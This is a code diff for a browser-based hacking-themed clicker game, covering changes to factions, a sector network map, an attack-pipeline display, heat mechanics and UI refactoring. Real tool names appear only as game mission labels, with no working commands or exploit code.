-    btn.textContent=hasQueue?'[ TAP TO PRE-STAGE NEXT ]':`[ ${drvTag(t?.driver||'cpu')} PROCESSING... ]`;
-    btn.className=hasQueue?'':'proc';
-    return;
+    const allT=[...MT,...Object.values(FACTION_MT).flat()];
+    const t=allT.find(t=>t.id===G.activeMission);
+    const hasPS=G.missionQueue.length>0&&PS.typed<PS.command.length;
+    btn.textContent=hasPS?'[ TAP TO PRE-STAGE ]':`[ ${dTag(t?.driver||'cpu')} PROCESSING... ]`;
+    btn.className=hasPS?'':'proc'; return;
   }
   if(G.typingTier>=3){btn.textContent='[ AUTO-EXECUTING ]';btn.className='idle';return;}
   if(G.typingTier===2){btn.textContent='[ TAP TO RUN COMMAND ]';btn.className='';return;}
-  btn.textContent=G.typingTier===1?'[ TAP TO AUTOCOMPLETE ]':'[ TAP TO TYPE ]';
-  btn.className='';
+  btn.textContent=G.typingTier===1?'[ TAP TO AUTOCOMPLETE ]':'[ TAP TO TYPE ]'; btn.className='';
 }
 
-// ══════════════════════════════════════════════════════
+// ═══════════════════════════════════════════════
 // AUTO TICK
-// ══════════════════════════════════════════════════════
+// ═══════════════════════════════════════════════
 function startAutoTick(){
   if(autoInt)return;
-  log('> SCHEDULER ONLINE','info');
+  log('> SCHEDULER ONLINE — autonomous mode','info');
   autoInt=setInterval(()=>{
     if(!G.missionRunning){autoStartBest();return;}
     if(G.phase!=='type'||G.heat>=100)return;
     const total=TS.command.length; if(!total)return;
-    const m=MISSIONS.find(m=>m.id===G.activeMission); if(!m)return;
+    const allM=[...MISSIONS,...FACTION_MISSIONS];
+    const m=allM.find(m=>m.id===G.activeMission); if(!m)return;
     const adv=Math.max(2,Math.floor(getBWT()*1.5));
     TS.typed=Math.min(TS.typed+adv,total); renderCmd();
     const pct=Math.min(100,(TS.typed/total)*100); G.missionProgress=pct; updatePct(pct);
-    addHeat((m.hPC||.02)*adv);
-    if(TS.typed>=total){setTimeout(()=>{if(G.missionRunning&&G.phase==='type')startProcPhase(m);},300);}
+    addHeat((m.hPC||.04)*adv);
+    if(TS.typed>=total)setTimeout(()=>{if(G.missionRunning&&G.phase==='type')startProcPhase(m);},300);
   },350);
 }
 
-// ══════════════════════════════════════════════════════
-// HEAT
-// ══════════════════════════════════════════════════════
-function getHeatMult(){let m=1;if((G.upgrades.lat1||0)>=1)m*=.75;if((G.upgrades.lat2||0)>=1)m*=.5;if((G.upgrades.lat3||0)>=1)m*=.25;return m;}
+// ═══════════════════════════════════════════════
+// HEAT  (faster accumulation, slower decay)
+// ═══════════════════════════════════════════════
+function getHM(){let m=1;if((G.upgrades.lat1||0)>=1)m*=.75;if((G.upgrades.lat2||0)>=1)m*=.5;if((G.upgrades.lat3||0)>=1)m*=.25;return m;}
 function addHeat(amt){
-  G.heat=Math.min(100,G.heat+amt*getHeatMult()); updateHeatDisp();
-  if(G.heat>=100){log('> ⚠ TRACE COMPLETE — burned!','err');playFail();abortMission();G.heat=75;updateHeatDisp();}
+  const prev=G.heat;
+  G.heat=Math.min(100,G.heat+amt*getHM()); updateHD();
+  // Pulse trace bar at thresholds
+  if(prev<50&&G.heat>=50||prev<75&&G.heat>=75){
+    const trk=el('htrk'); trk.classList.remove('pulse');
+    void trk.offsetWidth; trk.classList.add('pulse');
+    setTimeout(()=>trk.classList.remove('pulse'),400);
+  }
+  if(G.heat>=100){log('> ⚠ TRACE COMPLETE — burned!','err');playFail();abortMission();G.heat=78;updateHD();}
 }
-function updateHeatDisp(){
-  const p=G.heat,f=document.getElementById('hfill');
-  f.style.width=p+'%'; document.getElementById('hpct').textContent=Math.floor(p)+'%';
+function updateHD(){
+  const p=G.heat,f=el('hfill');
+  f.style.width=p+'%'; el('hpct').textContent=Math.floor(p)+'%';
   f.style.background=p>=70?'#ff2d2d':p>=40?'#ffb700':'#00ff41';
 }
+// Slower decay — creates more tension
 setInterval(()=>{
   if(G.heat<=0||intState.active)return;
   const dm=(G.upgrades.dec1||0)>=1&&!G.missionRunning?2:1;
-  G.heat=Math.max(0,G.heat-.4*dm); updateHeatDisp();
+  G.heat=Math.max(0,G.heat-.25*dm); updateHD();
 },500);
 
-// ══════════════════════════════════════════════════════
+// ═══════════════════════════════════════════════
 // UPGRADES
-// ══════════════════════════════════════════════════════
-function buyUpgrade(id){
+// ═══════════════════════════════════════════════
+function buyUpg(id){
   const u=UPG.find(u=>u.id===id); if(!u)return;
   const lvl=G.upgrades[id]||0; if(lvl>=u.mx)return;
   if(!u.cond()){log('> Prerequisites not met.','warn');return;}
@@ -1068,108 +1228,225 @@ function buyUpgrade(id){
   log(`> INSTALLED: ${u.name}`,'ok'); playOK(); updateUI(); renderPanel('upgrades');
 }
 
-// ══════════════════════════════════════════════════════
+// ═══════════════════════════════════════════════
 // PRESTIGE
-// ══════════════════════════════════════════════════════
+// ═══════════════════════════════════════════════
 function canPrestige(){return G.credits>=10000||G.missionsCompleted>=40;}
 function doPrestige(){
   if(!canPrestige())return;
   if(!confirm('BURN THIS IDENTITY?\n\nAll progress lost. Rep +×0.5 permanently.'))return;
-  const aliases=['null_byte','d3m0n','ph4ntom','zero_cool','acid_burn','c3rb3rus','h4x0r_7','spectr3'];
+  const aliases=['null_byte','d3m0n','ph4ntom','zero_cool','acid_burn','c3rb3rus','h4x0r_7','spectr3','v01d_echo','nul_ptr'];
   const newAlias=aliases[(G.prestigeCount+1)%aliases.length];
-  document.getElementById('app').classList.add('glitch');
-  setTimeout(()=>document.getElementById('app').classList.remove('glitch'),400);
+  el('app').classList.add('glitch'); setTimeout(()=>el('app').classList.remove('glitch'),400);
   playPrestige();
-  const newRep=parseFloat((G.rep+.5).toFixed(1)),count=G.prestigeCount+1;
+  const newRep=parseFloat((G.rep+.5).toFixed(1)),count=G.prestigeCount+1,totCr=(G.totalCreditsEarned||0);
   G=JSON.parse(JSON.stringify(DS));
-  G.rep=newRep; G.prestigeCount=count; G.alias=newAlias; G.lastSeen=Date.now();
-  clearInterval(autoInt); autoInt=null; clearInterval(procInt); clearInterval(cdownInt);
-  term.innerHTML=''; shownStory.clear();
-  MISSIONS=MT.map(t=>genMission(t));
+  G.rep=newRep; G.prestigeCount=count; G.alias=newAlias; G.totalCreditsEarned=totCr; G.lastSeen=Date.now();
+  const snd=localStorage.getItem('hacknode_snd'); G.soundOn=snd==='1';
+  clearInterval(autoInt); autoInt=null; clearInterval(procInt); clearInterval(cdownInt); stopAmbient();
+  shownMsgs.clear(); MISSIONS=MT.map(t=>genMission(t)); FACTION_MISSIONS=[];
+  initNetworkMap(); term.innerHTML='';
   logSep(); log(`> IDENTITY BURNED. REP: ×${newRep.toFixed(1)}`,'warn');
-  log(`> NEW ALIAS: ${newAlias}`,'ok'); logSep();
-  updateUI(); updateTapBtn(); updateHeatDisp(); save();
+  log(`> NEW ALIAS: ${newAlias}`,'ok'); log(`> All-time earnings: $${fmtNum(totCr)}`,'dim'); logSep();
+  updateUI(); updateTapBtn(); updateHD(); save();
 }
 
-// ══════════════════════════════════════════════════════
-// UI
-// ══════════════════════════════════════════════════════
-function updatePct(p){document.getElementById('progfill').style.width=p+'%';document.getElementById('progpct').textContent=Math.floor(p)+'%';}
+// ═══════════════════════════════════════════════
+// UI HELPERS
+// ═══════════════════════════════════════════════
+function el(id){return document.getElementById(id);}
+function updatePct(p){el('progfill').style.width=p+'%';el('progpct').textContent=Math.floor(p)+'%';}
 function fmtNum(n){if(n>=1000000)return(n/1000000).toFixed(1)+'M';if(n>=1000)return(n/1000).toFixed(1)+'k';return Math.floor(n)+'';}
 function fmtBW(k){if(k>=1000000)return(k/1000000).toFixed(0)+'Gb';if(k>=1000)return(k/1000).toFixed(0)+'Mb';return k+'kb';}
 function fmtCPU(m){return m>=1000?(m/1000).toFixed(1)+'GHz':m+'MHz';}
 function updateUI(){
-  document.getElementById('s-cr').textContent=fmtNum(G.credits);
-  document.getElementById('s-bw').textContent=fmtBW(G.bandwidth);
-  document.getElementById('s-cpu').textContent=fmtCPU(G.cpu);
-  document.getElementById('s-rep').textContent='×'+G.rep.toFixed(1);
-  document.getElementById('alias-txt').textContent=G.alias;
-  updateQdisp(); updateTapBtn(); save();
+  el('s-cr').textContent=fmtNum(G.credits); el('s-bw').textContent=fmtBW(G.bandwidth);
+  el('s-cpu').textContent=fmtCPU(G.cpu); el('s-rep').textContent='×'+G.rep.toFixed(1);
+  el('alias-txt').textContent=G.alias;
+  updateQdisp(); updateTapBtn();
+  // Faction bar
+  if(G.faction){el('faction-bar').classList.add('on');el('faction-cipher').style.display=G.faction==='cipher'?'block':'none';el('faction-ghost').style.display=G.faction==='ghost'?'block':'none';}
+  save();
 }
 function showFloat(amt){
-  const el=document.createElement('div'); el.className='cfloat'; el.textContent='+$'+fmtNum(amt);
-  const r=document.getElementById('tapbtn').getBoundingClientRect();
-  el.style.left=(r.left+r.width/2-30)+'px'; el.style.top=(r.top-10)+'px';
-  document.body.appendChild(el); setTimeout(()=>el.remove(),1200);
+  const e=document.createElement('div'); e.className='cfloat'; e.textContent='+$'+fmtNum(amt);
+  const r=el('tapbtn').getBoundingClientRect();
+  e.style.left=(r.left+r.width/2-30)+'px'; e.style.top=(r.top-10)+'px';
+  document.body.appendChild(e); setTimeout(()=>e.remove(),1200);
 }
 
-// ══════════════════════════════════════════════════════
+// ═══════════════════════════════════════════════
 // PANELS
-// ══════════════════════════════════════════════════════
+// ═══════════════════════════════════════════════
 let curPanel='none';
 function showPanel(name){
-  const panel=document.getElementById('panel');
+  const panel=el('panel');
   document.querySelectorAll('.nb').forEach(b=>b.classList.remove('act'));
-  document.getElementById('nb-terminal').classList.remove('act');
-  if(name==='none'||name===curPanel){panel.classList.remove('on');curPanel='none';document.getElementById('nb-terminal').classList.add('act');return;}
+  el('nb-terminal').classList.remove('act');
+  if(name==='none'){panel.classList.remove('on');curPanel='none';el('nb-terminal').classList.add('act');return;}
+  if(name===curPanel){renderPanel(name);return;} // re-render same panel (e.g. faction choice -> missions)
   curPanel=name; panel.classList.add('on');
-  document.getElementById(`nb-${name}`)?.classList.add('act');
-  document.getElementById('panel-title').textContent=name.toUpperCase();
+  el(`nb-${name}`)?.classList.add('act');
+  if(name==='map') onTutMapOpened();
+  if(name==='upgrades') onTutHWOpened();
+  el('panel-title').textContent={missions:'OPS',map:'NETWORK MAP',market:'MARKET / APPS',upgrades:'HARDWARE',system:'SYSTEM'}[name]||name.toUpperCase();
   renderPanel(name);
 }
 function renderPanel(name){
-  const c=document.getElementById('panel-content'); c.innerHTML='';
+  const c=el('panel-content'); c.innerHTML='';
   if(name==='missions')renderMissions(c);
+  else if(name==='map')renderMap(c);
+  else if(name==='market'){renderMarket(c);renderScripts(c);}
   else if(name==='upgrades')renderUpgrades(c);
   else if(name==='system')renderSystem(c);
 }
 
+// Faction choice view (shown inside missions panel before alignment)
+function renderFactionChoice(container){
+  if(G.faction)return;
+  container.innerHTML='';
+  const hdr=document.createElement('div');
+  hdr.style.cssText='padding:12px;font-size:11px;color:#4a7a4a;line-height:1.7;border-bottom:1px solid #1a3a1a;';
+  hdr.innerHTML='<div style="color:#ffb700;margin-bottom:6px;letter-spacing:2px;">// FACTION ALIGNMENT</div>Two networks have noticed your work. Choose one. This is permanent.<br><br>';
+  container.appendChild(hdr);
+  const c1=document.createElement('div'); c1.className='faction-card cipher';
+  c1.innerHTML=`<div class="faction-title" style="color:#cc44ff">▲ CIPHER COLLECTIVE</div><div class="faction-desc">Underground hacker collective. High-risk missions, higher rewards. Darkweb access. They'll protect you — at a cost.<br><br>+15% rewards | Darkweb missions | ×1.2 heat</div>`;
+  c1.onclick=()=>chooseFaction('cipher'); container.appendChild(c1);
+  const c2=document.createElement('div'); c2.className='faction-card ghost';
+  c2.innerHTML=`<div class="faction-title" style="color:#00d4ff">▲ GHOSTNET</div><div class="faction-desc">Corporate espionage network. Steady contracts, clean exits. They'll keep the feds off your back — mostly.<br><br>+15% rewards | Corp espionage missions | ×0.9 heat</div>`;
+  c2.onclick=()=>chooseFaction('ghost'); container.appendChild(c2);
+}
+
+
+// ═══════════════════════════════════════════════
+// PIPELINE RENDERER
+// Shows the hacker attack chain with current progress
+// ═══════════════════════════════════════════════
+function renderPipeline(container){
+  // Pipeline steps — which missions fulfill each stage
+  const stages=[
+    {label:'RECON',    icon:'01', ids:['nmap_scan','nc_listen'],           desc:'Map the target. Reveal nodes.'},
+    {label:'EXPLOIT',  icon:'02', ids:['hydra_ssh','john_crack','aircrack','metasploit'], desc:'Gain access. Crack credentials.'},
+    {label:'EXFIL',    icon:'03', ids:['scp_exfil','sqlmap'],              desc:'Pull data. Fill market listings.'},
+    {label:'PERSIST',  icon:'04', ids:['ssh_backdoor','worm_deploy'],      desc:'Own the node. Passive income.'},
+  ];
+
+  const wrap=document.createElement('div');
+  wrap.style.cssText='padding:8px 10px;border-bottom:1px solid #1a3a1a;';
+
+  // Check which stages player has completed at least once
+  const completedMissions=new Set(Object.keys(G.knownTargets));
+  // Also count by mission type completions via missionsCompleted
+  const stageStatus=stages.map(st=>{
+    const hasAny=st.ids.some(id=>G.knownTargets[id]||
+      (G.missionsCompleted>0 && G.upgrades['bw1']&&st.label==='RECON')||
+      (G.missionsCompleted>=3&&st.label==='EXPLOIT')||
+      (G.missionsCompleted>=8&&st.label==='EXFIL')||
+      (G.missionsCompleted>=20&&st.label==='PERSIST'));
+    // A stage is active if its missions are unlocked
+    const isUnlocked=st.ids.some(id=>{
+      const t=MT.find(t=>t.id===id);
+      return t&&G.missionsCompleted>=t.unlockAt[0]&&G.credits>=t.unlockAt[1];
+    });
+    return{...st, done:hasAny, unlocked:isUnlocked};
+  });
+
+  // Render as horizontal chain
+  const chain=document.createElement('div');
+  chain.style.cssText='display:flex;align-items:center;gap:4px;margin-bottom:6px;overflow-x:auto;padding-bottom:2px;';
+  stageStatus.forEach((st,i)=>{
+    const step=document.createElement('div');
+    const active=G.activeMission&&st.ids.includes(G.activeMission);
+    const col=active?'#00ff41':st.done?'#ffb700':st.unlocked?'#4a7a4a':'#1a3a1a';
+    step.style.cssText=`flex-shrink:0;padding:4px 8px;border:1px solid ${col};border-radius:3px;font-size:9px;color:${col};letter-spacing:1px;background:${active?'rgba(0,255,65,.1)':'transparent'};`;
+    step.innerHTML=`<span style="opacity:.6">${st.icon}</span> ${st.label}${st.done?' ✓':''}${active?' ◄':''}`;
+    step.title=st.desc;
+    chain.appendChild(step);
+    if(i<stageStatus.length-1){
+      const arrow=document.createElement('span');
+      arrow.style.cssText=`color:${stageStatus[i+1].unlocked?'#4a7a4a':'#1a3a1a'};font-size:10px;flex-shrink:0;`;
+      arrow.textContent='→';
+      chain.appendChild(arrow);
+    }
+  });
+  wrap.appendChild(chain);
+
+  // Active stage description
+  const activeStage=stageStatus.find(s=>G.activeMission&&s.ids.includes(G.activeMission))||
+                    stageStatus.find(s=>s.unlocked&&!s.done)||
+                    stageStatus[stageStatus.length-1];
+  if(activeStage){
+    const hint=document.createElement('div');
+    hint.style.cssText='font-size:10px;color:#4a7a4a;';
+    const nextStage=stageStatus.find(s=>!s.done&&s.unlocked);
+    if(nextStage&&nextStage!==activeStage){
+      hint.innerHTML=`Next: <span style="color:#ffb700">${nextStage.label}</span> — ${nextStage.desc}`;
+    } else if(activeStage.done){
+      const marketPending=(G.lootInventory||[]).reduce((a,l)=>a+l.qty*l.valueEach,0);
+      hint.innerHTML=marketPending>0
+        ?`MARKET: $${fmtNum(marketPending)} pending. <span style="color:#ffb700">Tap MKT to view.</span>`
+        :`Pipeline active. Keep running ops to fill the market.`;
+    } else {
+      hint.innerHTML=`<span style="color:#ffb700">${activeStage.label}:</span> ${activeStage.desc}`;
+    }
+    wrap.appendChild(hint);
+  }
+
+  container.appendChild(wrap);
+}
+
 function renderMissions(container){
-  MT.forEach(template=>{
+  // Show faction choice if pending
+  if(G.factionOffered&&!G.faction){
+    renderFactionChoice(container); return;
+  }
+
+  // Pipeline progress indicator
+  renderPipeline(container);
+
+  const allT=[...MT,...(G.faction&&FACTION_MT[G.faction]?FACTION_MT[G.faction]:[])];
+  allT.forEach(template=>{
     const[minM,minC]=template.unlockAt;
     const locked=G.missionsCompleted<minM||G.credits<minC;
     const isActive=G.activeMission===template.id;
     const isQueued=G.missionQueue.includes(template.id);
     const qpos=G.missionQueue.indexOf(template.id);
-    const mission=MISSIONS.find(m=>m.id===template.id);
+    const allM=[...MISSIONS,...FACTION_MISSIONS];
+    const mission=allM.find(m=>m.id===template.id);
     const hasIntel=!!G.knownTargets[template.id];
+    const isFaction=FACTION_MT[G.faction||'']?.some(t=>t.id===template.id);
     const card=document.createElement('div');
-    card.className=`mc ${locked?'locked':''} ${isActive?'active-m':''} ${isQueued?'queued':''} ${hasIntel&&!locked?'intel':''}`;
-    const reward=Math.floor(template.reward.base*G.rep*(1+G.missionsCompleted*.06));
+    card.className=`mc type-${template.type} ${locked?'locked':''} ${isActive?'active-m':''} ${isQueued?'queued':''} ${hasIntel&&!locked?'intel':''} ${isFaction?(G.faction+'-m'):''}`;
+    const reward=Math.floor(template.reward.base*G.rep*(1+G.missionsCompleted*.05)*(G.faction?1.15:1));
     const psecs=Math.ceil(getProcSecs(template));
     let lockMsg='';
-    if(G.missionsCompleted<minM)lockMsg=`🔒 Complete ${minM} missions`;
-    else if(G.credits<minC)lockMsg=`🔒 Need $${fmtNum(minC)}`;
+    if(G.missionsCompleted<minM)lockMsg=`🔒 ${minM} missions required`;
+    else if(G.credits<minC)lockMsg=`🔒 $${fmtNum(minC)} required`;
+    const lootDef=LOOT_TABLE[template.id];
+    const lootStr=lootDef?`+ ${lootDef.label}`:'';
     card.innerHTML=`
       <div class="mtitle">${template.name}<span class="mtag ${template.type}">${template.typeTag}</span></div>
-      ${isQueued?`<span class="qbadge">QUEUE #${qpos+1}</span>`:''}
-      ${hasIntel&&!locked?'<span class="intel-badge">INTEL ★</span>':''}
+      ${isQueued?`<span class="qbadge">Q#${qpos+1}</span>`:''}
+      ${hasIntel&&!locked?'<span class="intel-badge">INTEL★</span>':''}
       <div class="mdesc">${locked?lockMsg:(mission?.desc||'')}</div>
-      <div class="mmeta">
-        <span>~$<span class="v">${fmtNum(reward)}</span></span>
-        <span>PROC:<span class="v">~${psecs}s</span></span>
-        <span>TRACE:<span class="v">${template.hOC}%</span></span>
-        ${isActive?'<span class="v">► ACTIVE</span>':''}
-        ${hasIntel&&!locked?'<span style="color:#ffb700">⚡ BONUS</span>':''}
+      <div class="mreward">
+        <span>LOOT: <span class="v">${lootStr||'—'}</span></span>
+        <span>PROC: <span class="v">~${psecs}s</span></span>
       </div>
-      <div class="pbar-row"><span class="pbar-lbl">${drvTag(template.driver)}</span><div class="pbar-trk"><div class="pbar-fill" style="width:${Math.min(100,100/Math.max(psecs,1)*8)}%"></div></div></div>`;
+      <div class="mmeta">
+        <span>TRACE: <span class="v">${template.hOC}%</span></span>
+        ${isActive?'<span style="color:#00ff41">► ACTIVE</span>':''}
+        ${hasIntel&&!locked?'<span style="color:#ffb700">⚡ INTEL</span>':''}
+        ${isFaction?`<span style="color:${G.faction==='cipher'?'#cc44ff':'#00d4ff'}">★ FACTION</span>`:''}
+      </div>`;
     if(!locked&&!isActive&&!isQueued)card.onclick=()=>selectMission(template.id);
     else if(!locked&&isQueued)card.onclick=()=>{G.missionQueue=G.missionQueue.filter(id=>id!==template.id);updateQdisp();renderPanel('missions');log(`> Dequeued: ${template.name}`,'dim');};
     container.appendChild(card);
   });
+
   if(G.missionRunning){
     const ab=document.createElement('button');
-    ab.style.cssText='margin:10px;padding:10px;width:calc(100% - 20px);background:transparent;border:1px solid #ff2d2d;color:#ff2d2d;font-family:Share Tech Mono,monospace;font-size:11px;letter-spacing:2px;cursor:pointer;border-radius:4px;-webkit-appearance:none;';
+    ab.style.cssText='margin:10px;padding:10px;width:calc(100% - 20px);background:transparent;border:1px solid #ff2d2d;color:#ff2d2d;font-family:Share Tech Mono,monospace;font-size:11px;letter-spacing:2px;cursor:pointer;border-radius:4px;-webkit-appearance:none;display:block;';
     ab.textContent='[ ABORT MISSION ]';
     ab.onclick=()=>{G.missionQueue=[];updateQdisp();abortMission();showPanel('none');};
     container.appendChild(ab);
@@ -1177,17 +1454,148 @@ function renderMissions(container){
   if(G.maxQueueSize>1){
     const info=document.createElement('div');
     info.style.cssText='margin:8px 10px;padding:8px;border:1px solid #1a3a1a;border-radius:4px;font-size:10px;color:#4a7a4a;';
-    info.textContent=`Queue: ${G.missionQueue.length+(G.missionRunning?1:0)}/${G.maxQueueSize}. Tap to add/remove.`;
+    info.textContent=`Queue: ${G.missionQueue.length+(G.missionRunning?1:0)}/${G.maxQueueSize} slots. Tap to add/remove.`;
     container.appendChild(info);
   }
   // Intel section
-  const intelKeys=Object.keys(G.knownTargets);
-  if(intelKeys.length>0){
+  const ik=Object.keys(G.knownTargets);
+  if(ik.length){
     const sec=document.createElement('div');
     sec.style.cssText='margin:8px 10px;padding:8px;border:1px solid #2a2200;border-radius:4px;font-size:10px;color:#4a7a4a;background:rgba(255,183,0,.03);';
-    sec.innerHTML=`<div style="color:#ffb700;margin-bottom:4px;letter-spacing:2px;">// TARGET INTEL</div>${intelKeys.map(id=>{const t=MT.find(t=>t.id===id);const intel=G.knownTargets[id];return`<div>${t?t.name:id}: <span style="color:#00ff41">${intel.ip}</span></div>`;}).join('')}`;
+    sec.innerHTML=`<div style="color:#ffb700;margin-bottom:4px;letter-spacing:2px;">// TARGET INTEL</div>${ik.map(id=>{const t=[...MT,...Object.values(FACTION_MT).flat()].find(t=>t.id===id);const intel=G.knownTargets[id];return`<div>${intel.corp||t?.name||id}: <span style="color:#00ff41">${intel.ip}</span></div>`;}).join('')}`;
     container.appendChild(sec);
   }
+}
+
+function renderMap(container){
+  const wrap=document.createElement('div'); wrap.style.cssText='padding:10px 12px;';
+
+  // Sector selector tabs
+  const sectorRow=document.createElement('div'); sectorRow.style.cssText='margin-bottom:10px;';
+  SECTORS.forEach(s=>{
+    const unlocked=G.unlockedSectors.includes(s.id);
+    const tab=document.createElement('span');
+    tab.className=`sector-tab ${G.currentSector===s.id?'act':''} ${!unlocked?'locked':''}`;
+    tab.textContent=s.name; tab.style.borderColor=unlocked?s.color:'#1a3a1a'; tab.style.color=unlocked?(G.currentSector===s.id?s.color:'#4a7a4a'):'#1a3a1a';
+    if(unlocked) tab.onclick=()=>{G.currentSector=s.id;renderPanel('map');};
+    sectorRow.appendChild(tab);
+  });
+  wrap.appendChild(sectorRow);
+
+  // Sector progress
+  const sp=G.sectorProgress[G.currentSector]||{missions:0,owned:0};
+  const sector=SECTORS[G.currentSector];
+  const next=SECTORS[G.currentSector+1];
+  if(next&&!G.unlockedSectors.includes(next.id)){
+    const prog=document.createElement('div'); prog.style.cssText='font-size:10px;color:#4a7a4a;margin-bottom:8px;padding:6px 8px;border:1px solid #1a3a1a;border-radius:3px;';
+    prog.innerHTML=`<div style="color:#ffb700;margin-bottom:3px;">UNLOCK ${next.name}</div><div style="color:#4a7a4a;font-size:9px;margin-bottom:4px;">${next.desc||''}</div>Ops: <span style="color:#00ff41">${sp.missions}</span>/${next.req.missions} | Owned: <span style="color:#00ff41">${countOwnedInSector(G.currentSector)}</span>/${next.req.owned} | Credits: <span style="color:#00ff41">$${fmtNum(G.credits)}</span>/$${fmtNum(next.req.credits)}`;
+    wrap.appendChild(prog);
+  }
+
+  // ASCII map
+  const mapPre=document.createElement('pre');
+  mapPre.style.cssText='font-family:Share Tech Mono,monospace;font-size:10px;line-height:1.6;color:#4a7a4a;overflow-x:auto;';
+
+  const ns=s=>G.networkNodes[s]||{};
+  const sym=(id,lbl)=>{
+    const n=ns(id); const name2=lbl||n.name||id;
+    if(!n.status||n.status==='unknown') return `<span style="color:#1a3a1a">[ ??? ]</span>`;
+    const colors={owned:'#ffb700',scanned:'#00ff41',burned:'#ff2d2d',rival_cipher:'#cc44ff',rival_ghost:'#00d4ff',rival_gov:'#ff6600'};
+    const icons={owned:'★',scanned:'◆',burned:'✗',rival_cipher:'◈',rival_ghost:'◈',rival_gov:'⚑'};
+    const c=colors[n.status]||'#4a7a4a', ic=icons[n.status]||'?';
+    return `<span style="color:${c}">[${ic} ${name2}]</span>`;
+  };
+
+  // Build sector-specific maps
+  if(G.currentSector===0){
+    // Sector 0: your local network — no rivals, nodes revealed by recon
+    const randNodes=Object.entries(G.networkNodes).filter(([k,v])=>v.random&&v.sector===0);
+    mapPre.innerHTML=
+      `<span style="color:#00aa2a">// DOWNTOWN — ${G.alias}'s territory</span>\n`+
+      `<span style="color:#1a3a1a">${'─'.repeat(32)}</span>\n\n`+
+      `${sym('local_net','YOU: '+G.alias)}\n`+
+      `    │\n`+
+      `    ├── ${sym('cafe_wifi','CAFE WIFI')}\n`+
+      `    ├── ${sym('hotel_net','HOTEL NET')}\n`+
+      `    ├── ${sym('bodega_pos','BODEGA POS')}\n`+
+      `    ├── ${sym('street_cam','STREET CAM')}\n`+
+      `    └── ${sym('isp_relay','ISP RELAY')}\n`+
+      randNodes.map(([k,v])=>`    └── ${sym(k,v.name)}\n`).join('')+
+      `\n<span style="color:#4a7a4a">Scan the blocks. Own the nodes. Build your territory.</span>`;
+  } else if(G.currentSector===1){
+    mapPre.innerHTML=
+      `<span style="color:#ffb700">// FINANCIAL DISTRICT</span>\n`+
+      `<span style="color:#1a3a1a">${'─'.repeat(32)}</span>\n\n`+
+      `<span style="color:#4a7a4a">[ ENTRY POINT ]</span>\n`+
+      `    │\n`+
+      `    └── ${sym('fin_entry','FIN DISTRICT ENTRY')}\n`+
+      `            ├── ${sym('corp_db','CORP DATABASE')}\n`+
+      `            └── ${sym('corp_mail','CORP MAIL SRV')}\n`;
+  } else if(G.currentSector===2){
+    mapPre.innerHTML=
+      `<span style="color:#ff2d2d">// GOV QUARTER</span>\n`+
+      `<span style="color:#1a3a1a">${'─'.repeat(32)}</span>\n\n`+
+      `${sym('gov_subnet','CITY HALL NET')}\n`+
+      `    ├── ${sym('police_net','POLICE DISPATCH')}\n`+
+      `    ├── ${sym('transit_db','TRANSIT AUTH DB')}\n`+
+      `    └── <span style="color:#1a3a1a">[ ??? CLASSIFIED NODE ]</span>\n`;
+  } else {
+    mapPre.innerHTML=
+      `<span style="color:#cc44ff">// DARKWEB SECTOR</span>
+`+
+      `<span style="color:#1a3a1a">${'─'.repeat(32)}</span>
+
+`+
+      `${sym('darknet','DARKNET RELAY')}
+`+
+      `    ├── ${sym('market','DARKMARKET')}
+`+
+      `    └── ${sym('cipher_node','CIPHER NODE')}
+`;
+  }
+  wrap.appendChild(mapPre);
+
+  // Legend
+  const legend=document.createElement('div');
+  legend.style.cssText='font-size:9px;color:#4a7a4a;border-top:1px solid #1a3a1a;padding-top:6px;margin-top:4px;line-height:1.8;';
+  legend.innerHTML='<span style="color:#00ff41">◆ scanned</span>  <span style="color:#ffb700">★ owned</span>  <span style="color:#ff2d2d">✗ burned</span>  <span style="color:#cc44ff">◈ rival</span>  <span style="color:#1a3a1a">??? unknown</span>';
+  wrap.appendChild(legend);
+
+  // Rival nodes attackable list
+  const rivals=Object.entries(G.networkNodes||{}).filter(([k,v])=>v.status.startsWith('rival'));
+  if(rivals.length){
+    const rsec=document.createElement('div'); rsec.style.cssText='margin-top:10px;';
+    rsec.innerHTML='<div style="font-size:9px;color:#ff2d2d;letter-spacing:2px;margin-bottom:6px;">// RIVAL NODES — ATTACKABLE</div>';
+    rivals.forEach(([k,v])=>{
+      const card=document.createElement('div');
+      card.className=`rival-card ${v.status==='rival_ghost'?'ghost-rival':''}`;
+      const factionName=v.status==='rival_cipher'?'CIPHER':v.status==='rival_ghost'?'GHOSTNET':'GOV';
+      card.innerHTML=`<span style="color:${v.status==='rival_cipher'?'#cc44ff':v.status==='rival_ghost'?'#00d4ff':'#ff6600'}">${factionName}</span> controls ${v.name||k} — <span style="color:#ffb700">tap to launch attack op</span>`;
+      card.onclick=()=>{
+        // Queue an nmap against this node
+        log(`> TARGET ACQUIRED: ${v.name||k} (${factionName} node)`,'warn');
+        showPanel('none');
+      };
+      rsec.appendChild(card);
+    });
+    wrap.appendChild(rsec);
+  }
+
+  // Owned nodes with script status
+  const owned2=Object.entries(G.networkNodes||{}).filter(([k,v])=>v.status==='owned');
+  if(owned2.length){
+    const osec=document.createElement('div'); osec.style.cssText='margin-top:8px;';
+    osec.innerHTML='<div style="font-size:9px;color:#ffb700;letter-spacing:2px;margin-bottom:6px;">// YOUR NODES</div>';
+    owned2.forEach(([k,v])=>{
+      const scripts=(G.deployedScripts||[]).filter(s=>s.nodeId===k&&s.active);
+      const el3=document.createElement('div'); el3.style.cssText='font-size:10px;color:#4a7a4a;margin-bottom:3px;';
+      el3.innerHTML=`<span style="color:#ffb700">★</span> ${v.name||k}${scripts.length?` — <span style="color:#00ff41">${scripts.map(s=>s.scriptId).join(', ')}</span>`:''}`;
+      osec.appendChild(el3);
+    });
+    wrap.appendChild(osec);
+  }
+
+  container.appendChild(wrap);
 }
 
 function renderUpgrades(container){
@@ -1199,36 +1607,40 @@ function renderUpgrades(container){
     const card=document.createElement('div');
     card.className=`uc ${maxed?'maxed':''} ${!canAfford&&!maxed?'broke':''}`;
     card.innerHTML=`<div class="uinfo"><div class="uname">${u.name}</div><div class="udesc">${u.desc}</div></div><div class="ucost">${maxed?'<span style="color:#00aa2a">INSTALLED</span>':`<div class="cv">$${fmtNum(cost)}</div>`}</div>`;
-    if(!maxed)card.onclick=()=>buyUpgrade(u.id);
+    if(!maxed)card.onclick=()=>buyUpg(u.id);
     container.appendChild(card);
   });
 }
 
 function renderSystem(container){
-  const intelCount=Object.keys(G.knownTargets).length;
+  const owned=Object.values(G.networkNodes).filter(n=>n.status==='owned').length;
   container.innerHTML=`
